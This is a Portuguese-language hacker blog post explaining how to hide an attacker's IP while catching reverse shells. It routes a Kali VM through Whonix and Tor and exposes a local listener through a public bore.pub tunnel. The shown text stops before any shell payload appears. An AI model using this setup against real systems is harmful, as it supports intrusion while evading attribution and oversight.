---
title: be stealth on reverse-shell
author: b1tk1ll
date: 2026-07-30
new: true
theme: privacy
tags: [privacy]
description: como subir um tunnel stealth e trggar revshell.
cover:
  hideTitle: true
  caption: tsoi32
  image: posts/rev-shell/rev.jpg
---

O intuito desse paper é simples! quer subir shell e tá sem VPS? então leia (ou não também, foda-sekkkkkkk)

O passo a passo é basicamente esse:
1. setup-ar uma VM over TOR
2. obter os binarios e subir o tunnel (para mascarar o IP)
3. testar e ver se funciona!

  
  
# My SetUp (kaliVM over Whonix)
  
  
  
```ascii
       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀▗▄▄▖▗▄▄▄▖▗▄▄▄▖▗▖⠀▗▖▗▄▄▖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀▐▌⠀⠀⠀▐▌⠀⠀⠀⠀⠀█⠀⠀▐▌⠀▐▌▐▌⣀▐▌⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀▝▀▚▖▐▛▀▀▘⠀⠀█⠀⠀▐▌⣤▐▌▐▛▀▘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀▗▄▄▞▘▐▙▄▄▖⠀⠀█⣤⣾▝▚▄▞▘▐▌⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⠿⠛⠛⠀⠀⠀⠀⠀⠀⡀⠀⠘⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⡿⠛⢉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣷⣤⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⣠⡆⠀⠀⠀⠀⠀⠀⠀⠀⠸⣶⣄⠈⢿⣿⣧⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⡟⠀⣴⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣼⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⣿⣿⡆⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣆⠀⠿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠟⠁⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠙⠿⣷⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠟⠁⣰⣿⣿⣿⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣷⣤⣄⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠊⢉⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣤⣀⣀⣀⠀⡀⣀⣀⣀⣀⣤⣴⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⢈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢁⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠘⢿⣶⣦⠀⢈⡉⠛⠛⠻⠿⠿⠿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠛⠋⠉⣀⣤⣶⡟⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⠻⣿⠀⢸⣿⣿⣶⣶⡆⠀⣤⣤⣤⣄⣠⡀⢠⣤⣤⣤⣶⣶⠀⣿⣿⣿⠏⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⠀⢸⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⠀⡿⠏⢁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡈⠙⠻⠿⡇⠀⣿⣿⣿⣿⣿⠆⢸⣿⣿⣿⡿⠏⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄⣀⡉⠙⠛⠛⠛⠂⠘⠉⢉⣀⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
░  ░░░░  ░░  ░░░░  ░░░░░░░░   ░░░  ░░        ░░░      ░░░░      ░░░░      ░░
▒  ▒▒▒▒  ▒▒   ▒▒   ▒▒▒▒▒▒▒▒    ▒▒  ▒▒▒▒▒  ▒▒▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒
▓▓  ▓▓  ▓▓▓        ▓▓▓▓▓▓▓▓  ▓  ▓  ▓▓▓▓▓  ▓▓▓▓▓  ▓▓▓   ▓▓  ▓▓▓   ▓▓  ▓▓▓▓  ▓
███    ████  █  █  ████████  ██    █████  █████  ████  ██  ████  ██        █
████  █████  ████  ████████  ███   ██        ███      ████      ███  ████  █
```



Bom... primeiro, tenha uma `Virtual Machine over TOR`!

> NOTE:
> Você pode escolher sua VM. 
> Eu to usando o gateway do whonix dentro da distro do kali-linux.
> Dai eu derrubei todas as interfaces de rede padrão do kali, e subi só uma que se conecta ao gateway do whonix
> Existem tutoriais por ai para fazer isso, aqui está um deles: [`complete-anonymity-on-kali-linux-using-tor-whonix-and-vpn`](https://medium.com/@redfanatic7/complete-anonymity-on-kali-linux-using-tor-whonix-and-vpn-16cf9aa2ebdc)
>
> ```
> KALI `->` WHONIX GATEWAY `->` TOR `->` INTERNET
> ```


Agora, só pra validar vou dar um curl no check.torproject.org só pra verificar se tá tudo certo.

```bash
32@64~# curl https://check.torproject.org -s | grep "Congratulations"
      Congratulations. This browser is configured to use Tor.
      Congratulations. This browser is configured to use Tor.
```

ok! tudo certo, nossa VM está buscando dados através do TOR, podemos partir para implementação do tunnel!
  
  


# p1ng tunn3l! :p
  
```ascii
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡶⠶⢖⠦⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣷⡀⠀⠀⠀⠀⠀⠐⠋⠉⠉⠛⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⠀⠀⢀⠇⠈⢳⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀_⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⠀⠀⠀⢀⣀⣠⠤⠤⠤⠤⠤⠤⠤⢌⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢻⠀⠀⠀⠀⠈⠀⠀⢸⠇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀|⠀|__⠀⠀⠀___⠀⠀⠀⠀⠀⠀⠀⠀⣼⠁⣠⠤⠒⣋⡭⠤⠒⠒⠉⠉⡩⢟⣣⣤⣀⡢⣬⣉⠒⠤⣄⠀⠀⠀⠀⠀⠀⠀⠀⢼⠈⠃⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀|⠀'_⠀\⠀/⠀_⠀\⠀⠀⠀⠀⠀⠀⣠⠖⣉⠴⠒⠉⠀⠀⠀⠀⠀⢀⣞⣴⠟⠋⠉⠛⢿⣾⣎⠑⢤⡀⠙⠢⣄⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⣸⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀|⠀|_)⠀|⠀⠀__/⠀⠀⠀⢀⡴⢋⡤⢊⣁⡀⠀⠀⠀⠀⠀⠀⠀⣞⣾⠃⠀⠀⠀⠀⠀⠹⣿⡄⠀⠱⡄⠀⠈⠑⣄⠀⠀⢀⣠⣽⠶⠶⠶⠒⠒⠒⠛⢤⣄⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀|_.__/⠀\___|⠀⠀⣠⠋⡴⢋⢔⣭⣴⣿⣷⣤⠀⠀⠀⠀⠰⣽⠃⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠘⡄⠀⠀⠈⢳⣶⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠯⠻⣦⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⢡⠎⢠⢯⣿⠋⠁⠀⠈⠻⣷⠀⠀⠀⠀⡏⠀⠀⠀⠐⢷⢶⣄⠀⠀⣿⠀⠀⠐⠁⠀⠀⢰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠪⠙⣆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⢠⠃⠀⣮⡿⠁⠀⠀⠀⠀⠀⠻⣇⠀⠀⢸⡇⠀⠀⢀⠀⣸⣷⣻⡄⠀⣿⠀⠀⠀⠀⠀⠀⣏⠓⠒⢀⣀⣀⣀⣀⣀⣀⣀⣀⠀⢠⠖⠀⠀⠀⠘⡄
⠀⠀⣀⣠⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⢀⠇⠀⢰⣿⠇⠀⠀⠀⠀⠶⣶⡄⢹⠀⠀⠀⡇⠀⠀⣾⢹⣿⣿⣏⡇⠀⣿⠀⠀⣀⣤⡤⠤⣼⣶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠉⠙⡇⠀⠀⠀⠀⠀⠀
⣠⢾⠋⠀⠀⠈⠻⡷⣄⠀⠀⠀⠀⠀⠀⢰⠁⠸⠀⠀⠸⣿⠀⠀⠀⠀⣄⣀⣷⣽⣸⠀⠀⠀⣇⠀⠀⠸⣞⣿⣅⣽⠁⢀⣇⣴⠞⠋⠁⠀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⠀⠀⠀⠀⠀⠀
⡇⠘⠂⠀⠀⠀⠀⠁⠘⡆⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⣇⣿⣿⣿⣿⠀⠀⠀⠸⡄⠀⠀⠙⠧⠽⠃⠀⡼⠋⠀⠀⠀⠀⠀⣯⠦⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀
⢳⡀⠀⠀⠀⠀⠀⠀⢀⣹⣤⣤⣤⣤⣄⡇⠀⠰⠀⠀⠀⣿⠀⠀⠀⠀⢻⡽⠿⣾⢹⠀⠀⠀⠀⠻⡄⠀⠀⠀⠀⢠⠞⠁⠀⣀⣀⡀⠀⠀⠘⢧⡀⣠⣤⡶⠖⠛⠛⠛⠒⠒⡞⠀⠀⠀⠀⠀⠀⢀⠀
⠀⠉⠳⣄⠀⢀⡤⡺⠛⠉⠀⠀⠀⠀⠈⣻⢦⠀⠀⠀⠀⢻⡆⠀⠀⠀⠈⠻⠟⢁⡎⠀⠀⠀⠀⠀⠙⠦⣄⣀⣤⠟⠀⠀⠉⣀⣀⣀⡉⠂⠀⠀⣽⣏⠁⠀⠀⠀⠀⠀⠀⠀⢇⠀⠀⠀⠀⠀⢠⡞⠀
⠀⠀⠀⢈⣷⠋⠀⠁⠀⠀⠀⠀⠀⢈⣩⣤⣼⣧⣤⡀⠀⠀⠻⡄⠀⠀⠀⠀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣈⣭⠵⠒⠋⠉⠂⠀⠀⠹⡌⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀
⠀⠀⠀⣾⠋⠀⠀⠀⠀⠀⢀⡤⠞⠉⠉⠀⠀⠀⠈⣻⡆⠀⣀⣙⡦⠤⣀⣤⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠋⣡⡏⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⡀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠋⠁⠀⠀⠀
⠀⠀⢸⠇⠀⠀⠀⠀⢀⡶⠉⠀⠀⠀⠀⠀⠀⠀⠈⠁⡧⠋⠉⠁⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠚⠉⠀⢀⣴⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⠈⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⠀⠀⠀⠉⠑⢏⠀⠀⠀⠀⠀⠀⣀⣤⠶⠶⠾⣧⡀⠀⠀⠀⠀⠀⣤⣤⣤⣤⡤⠒⠒⠉⠁⠀⠀⣀⣤⣶⠿⢿⡿⠀⠀⠀⠀⠀⠀⠀⠀⢀⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⡆⠀⠀⠀⠀⠈⠇⠀⠀⢀⡤⠚⠉⠀⠀⠀⠐⠁⡇⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣶⣶⣶⣶⣾⠿⣿⡟⠁⠀⣼⠃⠀⠀⠀⠀⠀⣠⠞⣠⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⠉⠻⡄⠀⠀⠀⠀⠀⠀⣰⠁⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⠃⣠⠏⠀⠀⣰⠏⠀⠀⠀⠀⠠⠞⢁⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠊⠀⠀⠀⠀⢀⡴⠋⠳⢄⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⠁⠊⠀⠀⢀⡰⠋⠀⠀⠀⠀⠀⣠⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠑⠦⣀⡀⠀⠀⠀⠀⠀⣀⡠⠖⠋⠀⠀⠀⠀⠙⠢⢄⡀⠀⠀⠀⠀⠈⠛⢿⣇⣀⣀⣠⠴⠋⠀⠀⠀⢀⣀⠤⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠒⠒⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠒⠤⢤⣀⣀⣀⣀⣀⣀⣀⣀⡠⠤▗⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀▝▜⠀⠀⠀▗⠀⠀▐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                     ▄▖ ▗▟▄  ▄▖  ▄▖  ▐  ▗▟▄ ▐▗▖        
                                    ▐ ▝  ▐  ▐▘▐ ▝ ▐  ▐   ▐  ▐▘▐        
                                     ▀▚  ▐  ▐▀▀ ▗▀▜  ▐   ▐  ▐ ▐        
                                    ▝▄▞  ▝▄ ▝▙▞ ▝▄▜  ▝▄  ▝▄ ▐ ▐        
```
  

Chegou a hora do tunnel

Aqui, nós precisamos abrir um tunnel, para que nossa conexão trafegue por ele!

> NOTE: 
> Pra abrir o tunnel irei usar o bore! ele é opensource, e sem burocracia de criar conta igual aos tuneis da cloudflare!!!
> Porém é temporário, diferente do `cloudflared` que sobe o mesmo endereço:porta sempre (caso você tenha um dominio).


o repositorio do bore está aqui -> [`ekzhang/bore`](https://github.com/ekzhang/bore)

o bore suporta muita coisa... inclusive se você quiser deixar um tunnel exposto externamente pra você se conectar em alguma VPS ou maquina, você consegue (`bore server`).
Mas, como não iremos fazer self-hosting aqui, iremos usar o servidor padrão do bore, que é o bore.pub


pra subir uma conexão TCP com o servidor padrão do bore, é só usar:
```bash
32@64~# bore local 4444 --to bore.pub
```

`(fico imaginando as coisas que o administrador desse servidor deve ver nos logs diariamentekkkkkkkkkk)`


o bore funciona assim:

a gente abre uma conexão que se mantém ativa o tempo todo entre o server(`bore.pub:port`) e o client (`my-connection over TCP`)

```ascii
                                TCP
LOCAL CLIENT BORE <-----------------------------> SERVER BORE
```

Se você obersevar a conexão via `WIRESHARK`, vai ver que o tunnel fica pingando nossa maquina a cada segundo, 
enviando o code: "`HeartBeat`"

```
0000   45 00 00 40 52 a6 40 00 34 06 da c2 9f df 6e 9f   E..@R.@.4.....n.
0010   0a 29 00 a8 1e 9b a4 3c f4 a6 d7 90 15 3c 8f 1f   .).....<.....<..
0020   80 18 01 fd 35 59 00 00 01 01 08 0a 72 85 38 1e   ....5Y......r.8.
0030   c6 36 a1 c6 `22 48 65 61 72 74 62 65 61 74 22 00`   .6.."Heartbeat".
```

`22 48 65 61 72 74 62 65 61 74 22 00` = **HeartBeat**

o bore envia isso pra confirmar se a conexão continua ativa...



Eu não sei por quanto tempo o bore mantém uma conexão ativa, mas ja usei por dias o mesmo tunnel, e continuou funcionando perfeitamente.

O fluxo da conexão seria basicamente esse:

```ascii
    <----------------------------------TCP------------------------------------>

`KALI` (client do bore estabelece conexão) -> `WHONIX GATEWAY` -> `TOR` -> `BORE.PUB:port`

`KALI` (cliente do bore com conexão já estabelecida) <- `WHONIX GATEWAY` <- `TOR` <- `BORE.PUB:port`
```

`é uma suruba internétalkkkkkk, suruba de pacotes, suruba de tráfego`


E isso fica ativo até o encerramento do processo do bore! 
Todos os dados que chegam na porta que o bore.pub disponibilizou pra você, é enviado pra sua maquina.

Veja:

Eu abri um tunnel com o comando:

```bash
32@64~# bore local 4444 --to bore.pub
```

Agora vamos ver a porta que ele disponibilizou para nós!

```
INFO bore_cli::client: connected to server remote_port=4788
INFO bore_cli::client: listening at bore.pub:4788
```

Ele disponibilizou a porta `4788`! 
é essa porta que vou usar no reverse shell!



# get a shell!


```ascii
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢴⣲⣶⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀                                      
⠀⠀⠀⠀⠀⠀⠀⢠⢣⣾⠛⠉⠉⠉⠙⢻⣿⡆⠀⠀⠀⠀⠀⠀ ░██████    ░██████   ░██ ░██ ░██     
⠀⠀⠀⠀⠀⠀⢠⢃⡾⠋⠀⠀⠀⠀⠀⠀⢻⣿⡄⠀⠀⠀⠀⠀░██   ░██  ░██   ░██  ░██ ░██ ░██     
⠀⠀⠀⣠⣴⣶⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⢸⡿⡇⠀⠀⠀⠀░██        ░██     ░██ ░██ ░██ ░██     
⠀⣠⠾⠉⠁⢠⢳⡏⠎⠁⠁⠀⠀⠀⠀⠀⣼⣿⣧⣄⡀⠀⠀░██  █████ ░██     ░██ ░██ ░██ ░██     
⠀⠀⠀⠀⣀⣈⠉⠓⢦⡀⠀⠀⠀⠀⠀⢠⡟⣿⠉⠙⠻⣷⡀░██     ██ ░██     ░██ ░██ ░██ ░██     
⡆⠀⢰⣿⣿⣿⣿⣦⠀⣹⡄⠀⠀⠀⠀⠀⠈⠉⠉⠒⢤⡀⠻⡆░██  ░███  ░██   ░██                  
⢳⣄⠘⠿⣿⣿⡿⠏⣠⣿⠁⠀⡄⠀⢀⣶⣿⣿⣷⣄⠂⡽⡄⠀ ░█████░█   ░██████   ░██ ░██ ░██     
⠀⠈⠻⠶⢖⣲⣺⠼⠛⠁⠀⠀⠹⣄⠈⠻⣿⣿⣿⠟⢀⣼⠇⠀        _                 _       _ _ 
⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠈⠻⣷⣖⣖⣲⣼⠿⠋⠀⠀___ ___| |_    ___    ___| |_ ___| | |
⠀⠀⠀⠀⠀⣿⣿⠀⣤⡄⠀⠀⠀⠀⠀⣿⣿⡎⠀⠀⣠⡄⠀| . | -_|  _|  | .'|  |_ -|   | -_| | |
⠀⠀⠀⠀⠀⣿⣿⢀⣿⡇⠀⠀⠀⠀⠀⣿⣿⠁⠀⣸⣿⠇⠀|_  |___|_|    |__,|  |___|_|_|___|_|_|
⠀⠀⠀⠀⠀⣿⣿⠀⣿⡇⠀⠀⠀⠀⠀⣿⣿⠀⢠⣿⡟⠀⠀|___|                                  
⠀⠀⠀⠀⠀⣿⣿⠀⣿⡇⠀⠀⠀⠀⠀⣿⣿⠀⢸⣿⡇⠀⠀⠀                                      
⠀⠀⠀⠀⠀⢻⡯⡇⣿⣳⠀⠀⠀⠀⠀⣿⣿⠀⢹⣾⠇⠀⠀⠀                                      
⠀⠀⠀⠀⠀⢸⡗⡇⢻⣾⡀⠀⠀⠀⠀⣿⣿⠀⢸⣯⡇⠀⠀⠀                                      
⠀⠀⠀⠀⠀⢸⣿⢣⠘⣷⣣⠀⠀⠀⢀⣏⡿⠀⢸⡷⣇⠀⠀⠀                                      
⠀⠀⠀⠀⠀⠀⣿⡺⠀⠙⣷⣽⣒⣒⣮⡾⠃⠀⠰⣿⣯⠀⠀⠀                                      
⠀⠀⠀⠀⠀⠀⢹⣧⠇⠀⠀⠈⠉⠉⠁⠀⠀⠀⠰⣿⣿⠀⠀⠀                                      
⠀⠀⠀⠀⠀⠀⠈⣿⡼⡀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡗⠀⠀⠀                                      
⠀⠀⠀⠀⠀⠀⠀⠘⣧⡵⡀⠀⠀⠀⠀⠀⠀⢀⣎⣿⠁⠀⠀⠀                                      
⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣟⢄⡀⠀⠀⢀⡠⢜⣸⠇⠀⠀⠀⠀                                      
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢷⣯⣭⣭⡵⠾⠛⠁⠀⠀⠀⠀⠀                                      
```


hora de pegar a shell através do tunnel!

